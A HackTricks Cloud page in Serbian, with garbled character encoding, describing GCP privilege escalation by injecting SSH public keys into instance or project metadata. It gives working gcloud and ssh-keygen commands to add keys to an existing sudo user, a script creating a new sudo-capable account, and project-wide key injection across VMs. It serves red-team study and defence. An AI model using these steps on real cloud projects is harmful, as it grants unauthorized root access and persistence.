# GCP - Dodavanje prilagoÄ‘enih SSH metapodataka

## GCP - Dodavanje prilagoÄ‘enih SSH metapodataka

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¡ka HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

### Modifikacija metapodataka <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Modifikacija metapodataka na instanci moÅ¾e dovesti do **znaÄajnih bezbednosnih rizika ako napadaÄ dobije potrebne dozvole**.

#### **UkljuÄivanje SSH kljuÄeva u prilagoÄ‘ene metapodatke**

Na GCP-u, **Linux sistemi** Äesto izvrÅ¡avaju skripte iz [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). KritiÄna komponenta ovoga je [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), koji je dizajniran da **redovno proverava** krajnju taÄku metapodataka instance za **aÅ¾uriranja autorizovanih SSH javnih kljuÄeva**.

Stoga, ako napadaÄ moÅ¾e da modifikuje prilagoÄ‘ene metapodatke, mogao bi da natera daemon da pronaÄ‘e novi javni kljuÄ, koji Ä‡e biti obraÄ‘en i **integrisan u lokalni sistem**. KljuÄ Ä‡e biti dodat u `~/.ssh/authorized_keys` datoteku **postojeÄ‡eg korisnika ili potencijalno kreirati novog korisnika sa `sudo` privilegijama**, u zavisnosti od formata kljuÄa. A napadaÄ Ä‡e moÄ‡i da kompromituje host.

#### **Dodavanje SSH kljuÄa postojeÄ‡em privilegovanom korisniku**

1. **IstraÅ¾ite postojeÄ‡e SSH kljuÄeve na instanci:**
*   IzvrÅ¡ite komandu da opiÅ¡ete instancu i njene metapodatke kako biste locirali postojeÄ‡e SSH kljuÄeve. Relevantni deo u izlazu biÄ‡e pod `metadata`, posebno kljuÄ `ssh-keys`.

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
* Obratite paÅ¾nju na format SSH kljuÄeva: korisniÄko ime prethodi kljuÄevi, odvojeni dvotaÄkom.
2. **Pripremite tekstualnu datoteku za SSH kljuÄ metapodatke:**
* SaÄuvajte detalje korisniÄkih imena i njihovih odgovarajuÄ‡ih SSH kljuÄeva u tekstualnu datoteku pod imenom `meta.txt`. Ovo je neophodno za oÄuvanje postojeÄ‡ih kljuÄeva dok dodajete nove.
3. **GeneriÅ¡ite novi SSH kljuÄ za ciljanog korisnika (`alice` u ovom primeru):**
*   Koristite komandu `ssh-keygen` da generiÅ¡ete novi SSH kljuÄ, osiguravajuÄ‡i da se polje komentara (`-C`) poklapa sa ciljnim korisniÄkim imenom.

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
* Dodajte novi javni kljuÄ u `meta.txt`, imitujuÄ‡i format koji se nalazi u metapodacima instance.
4. **AÅ¾urirajte SSH kljuÄ metapodatke instance:**
*   Primijenite aÅ¾urirane SSH kljuÄ metapodatke na instancu koristeÄ‡i komandu `gcloud compute instances add-metadata`.

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
5. **Pristupite instanci koristeÄ‡i novi SSH kljuÄ:**
*   PoveÅ¾ite se na instancu putem SSH koristeÄ‡i novi kljuÄ, pristupajuÄ‡i shell-u u kontekstu ciljanog korisnika (`alice` u ovom primeru).

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **Kreirajte novog privilegovanog korisnika i dodajte SSH kljuÄ**

Ako se ne pronaÄ‘e zanimljiv korisnik, moguÄ‡e je kreirati novog koji Ä‡e dobiti `sudo` privilegije:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### SSH kljuÄevi na nivou projekta <a href="#sshing-around" id="sshing-around"></a>

MoguÄ‡e je proÅ¡iriti domet SSH pristupa na viÅ¡e Virtuelnih MaÅ¡ina (VM) u cloud okruÅ¾enju **primenom SSH kljuÄeva na nivou projekta**. Ovaj pristup omoguÄ‡ava SSH pristup bilo kojoj instanci unutar projekta koja nije eksplicitno blokirala SSH kljuÄeve na nivou projekta. Evo saÅ¾etog vodiÄa:

1. **Primena SSH kljuÄeva na nivou projekta:**
*   Koristite komandu `gcloud compute project-info add-metadata` da dodate SSH kljuÄeve iz `meta.txt` u metapodatke projekta. Ova akcija osigurava da SSH kljuÄevi budu prepoznati na svim VM-ovima u projektu, osim ako VM nema omoguÄ‡enu opciju "Blokiraj SSH kljuÄeve na nivou projekta".

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
2. **SSH u instance koristeÄ‡i kljuÄeve na nivou projekta:**
* Sa SSH kljuÄevima na nivou projekta, moÅ¾ete SSH u bilo koju instancu unutar projekta. Instance koje ne blokiraju kljuÄeve na nivou projekta Ä‡e prihvatiti SSH kljuÄ, omoguÄ‡avajuÄ‡i pristup.
* Direktna metoda za SSH u instancu je koriÅ¡Ä‡enje komande `gcloud compute ssh [INSTANCE]`. Ova komanda koristi vaÅ¡e trenutno korisniÄko ime i SSH kljuÄeve postavljene na nivou projekta da pokuÅ¡a pristup.

## Reference

* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
